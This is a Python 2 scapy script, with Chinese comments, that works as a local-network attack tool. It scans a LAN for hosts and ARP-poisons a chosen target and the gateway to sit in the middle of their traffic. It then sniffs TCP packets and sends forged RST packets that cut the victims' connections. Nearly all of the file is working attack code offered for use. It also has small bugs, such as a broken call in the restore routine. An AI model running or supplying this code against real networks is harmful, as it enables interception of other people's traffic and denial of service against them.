# coding=utf-8
# ############################################################################# 
#= = 文件名称：CutDown.py 
#= = 文件描述：切断TCP连接 
#= = 作    者：indigo 
#= = 编写时间：2016-06-23 21:16:00 
# ############################################################################# 
from scapy.all import *
import os
import sys
import threading
import signal

#嗅探切断连接类
class Cutdown():
    Connection = []       #记录五元组的数组
    interface  = "eth0"   #使用的网络接口
    PerSniffTime = 0.5    #每次嗅探的时间
    Mode = 1              #嗅探模式 是否只探测自己网络的数据包
    
    def __init__(self):
        pass
    
    def tcp_icmp(self):
        target_pack = IP()/ICMP()
        target_pack.dst = '220.181.112.244'
        target_pack.src = '10.206.7.162'
        target_pack[ICMP].seq = 5
        #target_pack[TCP].flags = 4
        #target_pack.sport = 50929
        #target_pack.dport = 5000
        send(target_pack)    
        
    #对包的分析处理    目前之做了最基础的UDP TCP和ICMP协议包的处理
    def packet_callback(self,packet):
        #print packet.show()
        try:
            #ICMP包
            if packet[IP].proto == 1:
                print "[*]ICMP:%s -> %s" % (packet[IP].src,packet[IP].dst)         
            
            #TCP包
            if packet[IP].proto == 6:
                #对包做第一层的处理 去掉已经记录过的连接（ARP偷毒模式会嗅探到一个包两次）和第一次握手包
                if ([packet[IP].src,packet[IP].dst,packet[TCP].seq] not in self.Connection 
                    and packet[TCP].ack !=0):
                    self.Connection += [[packet[IP].src,packet[IP].dst,packet[TCP].seq]]
                    #self.Connection += [[packet[IP].dst,packet[IP].src,packet[TCP].ack]]#双向切断时使用
                    #print self.Connection
                    
                    #处理记录链接过多的情况 和嗅探时间参数配合使用
                    '''if (len(self.Connection)>20):
                        self.Connection = []
                        print "[*]Connection clear."
                        return'''
                    
                    #打印嗅探到的TCP连接 由于运行效率原因暂不使用
                    '''print "[*]TCP:%10s:%d -> %10s:%d\tSeq:%d Ack:%d" % (packet[IP].src,packet[TCP].sport,
                                                                        packet[IP].dst,packet[TCP].dport,
                                                                        packet[TCP].seq,packet[TCP].ack)'''
                    
                    '''
                    #双向切断
                    
                    self.send_rst_SA(packet[IP].src,packet[TCP].sport,
                                  packet[IP].dst,packet[TCP].dport,
                                  packet[TCP].seq,packet[TCP].ack,len(packet[TCP].payload))
                    '''
                    #单向切断
                    self.send_rst_S(packet[IP].src,packet[TCP].sport,
                                  packet[IP].dst,packet[TCP].dport,
                                  packet[TCP].seq,len(packet[TCP].payload)) 
                else:
                    return            
            #UDP包
            if packet[IP].proto == 17:             
                print "[*]UDP:%s:%d -> %s:%d" % (packet[IP].src,packet[UDP].sport,packet[IP].dst,packet[UDP].dport)         
        except :
            return
    
    #单向切断（只对根据Seq发送RST包而忽视ACK包）
    def send_rst_S(self,ip_a,port_a,ip_b,port_b,Seq,length):
        #构建包和五元组
        target_pack = IP()/TCP()
        target_pack.src = ip_a
        target_pack.dst = ip_b
        #可用的Seq数值需要加上数据长度计算得到
        target_pack[TCP].seq = Seq+length      
        target_pack[TCP].flags = 4
        target_pack.sport = port_a
        target_pack.dport = port_b
        send(target_pack,verbose=False)
        if(length > 0):
            target_pack[TCP].seq = Seq
            send(target_pack,verbose=False)
       
    #双向切断（根据Seq和Ack值向连接双方都发包）
    def send_rst_SA(self,ip_a,port_a,ip_b,port_b,Seq,Ack,length):
        target_pack = IP()/TCP()
        target_pack.src = ip_a
        target_pack.dst = ip_b
        target_pack[TCP].seq = Seq+length
        target_pack[TCP].flags = 4
        target_pack.sport = port_a
        target_pack.dport = port_b
        send(target_pack,verbose=False)
        if(length > 0):
            target_pack[TCP].seq = Seq
            send(target_pack,verbose=False)
            
        target_pack.src = ip_b
        target_pack.dst = ip_a
        target_pack[TCP].seq = Ack
        target_pack[TCP].flags = 4
        target_pack.sport = port_b
        target_pack.dport = port_a
        send(target_pack,verbose=False)       
        
        
    def start_sniff(self):
        print "[*]Start sniff"
        #循环嗅探
        while True:
            sniff(iface=self.interface,filter="tcp",prn=self.packet_callback,timeout= self.PerSniffTime,store = self.Mode)#store,timeout= 1
            print '[*]Restart sniff'

#Arp投毒类
class Arp_posion():
    #基础参数设置
    interface  = "eth0"
    target_ip  = "10.8.178.36"
    gateway_ip = "10.8.172.4"
    gateway_mac= None
    target_mac = None
    
    def set_args(self):
        arp_map = []
        
        #获取参数
        self.interface = raw_input("[*]Input the interface:")
        self.gateway_ip = raw_input("[*]Input the Gateway IP:")
        ipscan = raw_input("[*]Input the net:")
        #ipscan='10.8.189.83/24'
        
        print "IP:"
        
        #扫描得到所有局域网存活主机的ip和mac
        try:
            ans,unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=ipscan),timeout=2,verbose=False)
        except Exception,e:
            print str(e)
        else:
            i = 0
            for snd,rcv in ans:
                list_mac=rcv.sprintf("%Ether.src% - %ARP.psrc%")
                arp_map += [[rcv.sprintf("%Ether.src%"),rcv.sprintf("%ARP.psrc%")]]
                print arp_map[i][1]+'\t',
                i += 1
                if (i%4 ==0):
                    print "\n"
                    
        print "\n"
        #获取目标ip
        self.target_ip = raw_input("[*]Input the Target IP:")
    
    def restore_target(self):
        #解除投毒
        print "[*]Restoring target..."
        send(ARP(op = 2,psrc=self.gateway_ip,pdst=self.target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=self.gateway_mac),count=5, verbose=False)
        send(ARP(op = 2,psrc=self.target_ip,pdst=self.gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=self.target_mac),count=5, verbose=False)
        
    def get_mac(self,ip_address):
        responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10,
                                   verbose=False)
        
        #从返回响应数据中获取MAC
        for s,r in responses: 
            return r[Ether].src
    
        return None
    
    def poison_target(self):
        #构造双向的arp投毒包
        poison_target = ARP()
        poison_target.op = 2
        poison_target.psrc = self.gateway_ip
        poison_target.pdst = self.target_ip
        poison_target.hwdst= self.target_mac
        
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.target_ip
        poison_gateway.pdst = self.gateway_ip
        poison_gateway.hwdst= self.gateway_mac
        
        print "[*]Beginning the ARP poison.[CTRL-C to stop]"
        
        while True:
            try:
                send(poison_target, verbose=False)
                send(poison_gateway, verbose=False)
                
                time.sleep(0.5)
            except KeyboardInterrupt:
                restore_target()
        
        print "[*]ARP poison attack finished."
        
        return 
    
    def start_posion(self):
        #进行ip转发设置
        os.system("sysctl -w net.ipv4.ip_forward=1")
        print "[*]Setting up %s" % self.interface
        
        self.gateway_mac = self.get_mac(self.gateway_ip)
        
        if self.gateway_mac is None:
            print "[!!!]Failed to get gateway MAC.Exiting."
            sys.exit(0)
        else:
            print "[*]Gateway %s is at %s" %(self.gateway_ip,self.gateway_mac)
            
        target_mac = self.get_mac(self.target_ip)
        
        if target_mac is None:
            print "[!!!]Failed to get target MAC.Exiting."
            sys.exit(0)
        else:
            print "[*]Target %s is at %s" %(self.target_ip,target_mac)
            
        #启动ARP偷毒线程
        self.poison_target()
           
    def stop_posion(self):
        self.restore_target()

if __name__ == "__main__":  
    #初始化
    Cut = Cutdown()
    
    #根据用户选择进行相应设置
    arp = Arp_posion()
    Posion = raw_input("[*]Do you want to set a target?[y/n]:")
    if(Posion == 'Y' or Posion == 'y'):
        Cut.Mode = 0#设置不接受多余的数据包
        Set = raw_input("[*]Do you want to set arguments?[y/n]:")
        if(Set == 'Y' or Set == 'y'):
            arp.set_args()
    
            #开启ARP偷毒线程
            poison_thread = threading.Thread(target= arp.start_posion,args=())
            poison_thread.start()
    else:
        os.system("ifconfig eth0 promisc")
    #开启切断连接程序
    Cut.start_sniff()
    
    if(Posion == 'Y' or Posion == 'y'):
        arp.stop_posion()

